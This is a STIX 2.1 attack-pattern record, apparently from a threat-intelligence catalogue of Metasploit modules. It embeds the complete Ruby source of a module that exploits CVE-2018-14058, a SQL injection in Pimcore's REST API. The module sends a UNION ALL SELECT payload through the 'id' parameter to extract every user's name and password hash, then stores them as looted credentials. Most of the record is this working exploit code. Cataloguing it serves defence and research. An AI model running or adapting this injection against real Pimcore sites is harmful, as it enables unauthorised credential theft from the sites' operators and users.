{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6efbbb45-e2a2-4bb3-a1f9-f61042818e3e",
    "created": "2024-08-14T16:32:29.965483Z",
    "modified": "2024-08-14T16:32:29.965487Z",
    "name": "Pimcore Gather Credentials via SQL Injection",
    "description": " This module extracts the usernames and hashed passwords of all users of the Pimcore web service by exploiting a SQL injection vulnerability in Pimcore's REST API.  Pimcore begins to create password hashes by concatenating a user's username, the name of the application, and the user's password in the format USERNAME:pimcore:PASSWORD.  The resulting string is then used to generate an MD5 hash, and then that MD5 hash is used to create the final hash, which is generated using PHP's built-in password_hash function. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/pimcore_creds_sqli.rb",
            "external_id": "pimcore_creds_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-14058"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Pimcore Gather Credentials via SQL Injection',\n      'Description'    => %q{\n        This module extracts the usernames and hashed passwords of all users of\n        the Pimcore web service by exploiting a SQL injection vulnerability in\n        Pimcore's REST API.\n\n        Pimcore begins to create password hashes by concatenating a user's\n        username, the name of the application, and the user's password in the\n        format USERNAME:pimcore:PASSWORD.\n\n        The resulting string is then used to generate an MD5 hash, and then that\n        MD5 hash is used to create the final hash, which is generated using\n        PHP's built-in password_hash function.\n      },\n      'Author'         => [ 'Thongchai Silpavarangkura', # PoC\n                            'N. Rai-Ngoen',              # PoC\n                            'Shelby Pace'                # Metasploit Module\n                          ],\n      'License'        => MSF_LICENSE,\n      'References'     => [\n                            [ 'CVE', '2018-14058' ],\n                            [ 'EDB', '45208' ]\n                          ],\n      'Notes'          =>\n        {\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n      'DisclosureDate' => '2018-08-13'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The base path to pimcore', '/' ]),\n        OptString.new('APIKEY', [ true, 'The valid API key for Pimcore REST API', '' ])\n      ])\n  end\n\n  def available?\n    res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  normalize_uri(target_uri.path)\n    )\n\n    res && res.code == 200 && res.body.include?('pimcore')\n  end\n\n  def get_creds\n    api_uri = normalize_uri(target_uri.path, \"/webservice/rest/object-inquire\")\n    cmd = \"#{rand(256)}) UNION ALL SELECT CONCAT(name,\\\" \\\",password) from users#\"\n\n    res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  api_uri,\n      'vars_get'  =>  {\n        'apikey'  => datastore['APIKEY'],\n        'id'      => cmd\n      }\n    )\n\n    unless res\n      fail_with(Failure::NotFound, 'The request returned no results.')\n    end\n\n    fail_with(Failure::NoAccess, 'API key is invalid') if res.body.include?('API request needs either a valid API key or a valid session.')\n\n    format_results(res.get_json_document['data'])\n  end\n\n  def format_results(response)\n    fail_with(Failure::NotFound, 'No data found') unless response\n    creds = response.to_s.scan(/\"([^\\s]*)\\s(\\$[^(=>)]*)\"/)\n    fail_with(Failure::NotFound, 'Could not find any credentials') if creds.empty?\n\n    print_good(\"Credentials obtained:\")\n    creds.each do |user, pass|\n      print_good(\"#{user} : #{pass}\")\n      store_creds(user, pass)\n    end\n  end\n\n  def store_creds(username, hash)\n    store_valid_credential(\n      user: username,\n      private: hash,\n      private_type: :nonreplayable_hash,\n      service_data: {\n        jtr_format: 'bcrypt',\n        origin_type: :service,\n        address: rhost,\n        port: rport,\n        service_name: 'mysql',\n        protocol: 'tcp'\n      }\n    )\n  end\n\n  def run\n    fail_with(Failure::NotFound, 'Could not access the Pimcore web page.') unless available?\n    get_creds\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-08-13"
}